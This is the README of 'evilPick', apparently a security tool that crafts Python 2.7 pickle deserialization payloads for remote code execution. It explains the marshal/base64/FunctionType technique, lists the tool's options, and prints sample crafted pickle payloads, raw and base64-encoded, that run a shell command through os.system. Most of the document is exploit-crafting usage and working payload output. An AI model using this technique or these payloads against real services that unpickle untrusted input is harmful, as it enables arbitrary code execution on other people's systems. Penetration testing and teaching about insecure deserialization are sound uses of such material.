# evilPick
An Exploit Crafter to achieve Pickle Deserialization Remote Code Execution ,
Just provide the wanted to execute code and you're on the go.

It aims to automate in a simple way Exploit Crafting from python2.7 code files.
#### Know How
The main part of the exploit is written in  pickle machine language in order to invoke, on deserialization, the code provided by the user.

In particular the passed code is serialized with Marshall library, base64 encoded and put into the pickle machine code which
when deserialized will  :
- base64 decode the payload 
- marshal load the payload (in order to deserialize the code)
- statically build a function, inject the payload code in it
- call that function

## options 
- -f --foo  file_name.py  
craft an exploit that, on deserialization, will execute the given python2.7 code   
- -e --encode base64/hex 
encode the crafted exploit in base64 or hex 
- -s --file  new_file
the crafted exploit is then saved in a file
- -d --dynamic
dynamically write your python code and hit CTRL-C in a new line to end the code


## Examples
example.py code :
```python
import os
os.system("echo Hello World")
```
running evilPick passing the example.py file :
```sh
$ python evilPick.py --foo example.py 
___________________________________________________________
[^] Do you want to encode it? ( base64 or hex,leave for unicode) :        
[*] Crafted Evil Packet: 

ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'YwAAAAABAAAAAgAAAEMAAABzHQAAAGQBAGQAAGwAAH0AAHwAAGoBAGQCAIMBAAFkAABTKAMAAABOaf////9zEAAAAGVjaG8gSGVsbG8gV29ybGQoAgAAAHQCAAAAb3N0BgAAAHN5c3RlbSgBAAAAUgAAAAAoAAAAACgAAAAAcwgAAAA8c3RyaW5nPnQDAAAAZm9vAQAAAHMEAAAAAAEMAQ=='
tRtRc__builtin__
globals
(tRS''
tR(tR.

___________________________________________________________
[^] Do you want to save it? (y/n, leave to skip):  y
[^] Insert exploit name: example_exploit
[*] Writing it in example_exploit

__________________________Job_Done_________________________
```
running evilPick in dynamic mode with encode base64 option :
```sh
$ python evilPick.py -d -e base64 
___________________________________________________________
[*] Write code till SIGINT, have fun!

|import os
|os.system("echo Hello World!")
|^C

___________________________________________________________
[*] Crafted Evil Packet: 

Y3R5cGVzCkZ1bmN0aW9uVHlwZQooY21hcnNoYWwKbG9hZHMKKGNiYXNlNjQKYjY0ZGVjb2RlCihTJ1l3QUFBQUFCQUFBQUFnQUFBRU1BQUFCekhRQUFBR1FCQUdRQUFHd0FBSDBBQUh3QUFHb0JBR1FDQUlNQkFBRmtBQUJUS0FNQUFBQk9hZi8vLy85ekVRQUFBR1ZqYUc4Z1NHVnNiRzhnVjI5eWJHUWhLQUlBQUFCMEFnQUFBRzl6ZEFZQUFBQnplWE4wWlcwb0FRQUFBRklBQUFBQUtBQUFBQUFvQUFBQUFITUlBQUFBUEhOMGNtbHVaejUwQXdBQUFHWnZid0VBQUFCekJBQUFBQUFCREFFPScKdFJ0UmNfX2J1aWx0aW5fXwpnbG9iYWxzCih0UlMnJwp0Uih0Ui4=

___________________________________________________________
[^] Do you want to save it? (y/n, leave to skip):  n
```
running evilPick in quick mode providing : example.py (source code), encode schema base64 and destination file 
```sh
python evilPick.py -f example.py -e base64 -s new_exploit
___________________________________________________________
[*] Crafted Evil Packet: 

Y3R5cGVzCkZ1bmN0aW9uVHlwZQooY21hcnNoYWwKbG9hZHMKKGNiYXNlNjQKYjY0ZGVjb2RlCihTJ1l3QUFBQUFCQUFBQUFnQUFBRU1BQUFCekhRQUFBR1FCQUdRQUFHd0FBSDBBQUh3QUFHb0JBR1FDQUlNQkFBRmtBQUJUS0FNQUFBQk9hZi8vLy85ekVBQUFBR1ZqYUc4Z1NHVnNiRzhnVjI5eWJHUW9BZ0FBQUhRQ0FBQUFiM04wQmdBQUFITjVjM1JsYlNnQkFBQUFVZ0FBQUFBb0FBQUFBQ2dBQUFBQWN3Z0FBQUE4YzNSeWFXNW5QblFEQUFBQVptOXZBUUFBQUhNRUFBQUFBQUVNQVE9PScKdFJ0UmNfX2J1aWx0aW5fXwpnbG9iYWxzCih0UlMnJwp0Uih0Ui4=

___________________________________________________________
[*] Writing it in new_exploit

__________________________Job_Done_________________________
```

# Author
Lacerenza Francesco - Systems and Networks Security.
twitter: [@lacerenza_fra](https://twitter.com/lacerenza_fra)
linkedin: [lacerenzafrancesco](https://www.linkedin.com/in/francesco-lacerenza/)
